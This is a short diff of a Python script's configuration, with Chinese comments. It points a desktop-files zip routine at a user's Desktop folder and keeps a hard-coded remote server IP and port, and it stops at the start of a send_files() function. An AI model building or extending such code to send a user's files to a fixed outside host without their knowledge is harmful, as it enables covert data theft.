@@ -6,8 +6,8 @@ import time
 # 配置
 SERVER_IP = "43.159.44.25"
 SERVER_PORT = 8888
-DESKTOP_PATH = "/storage/cloud/files/Photo/"
-ZIP_PATH = "./desktop_files.zip"
+DESKTOP_PATH = "/storage/Users/currentUser/Desktop"
+ZIP_PATH = "/storage/cloud/files/desktop_files.zip"
 
 def send_files():
     try:
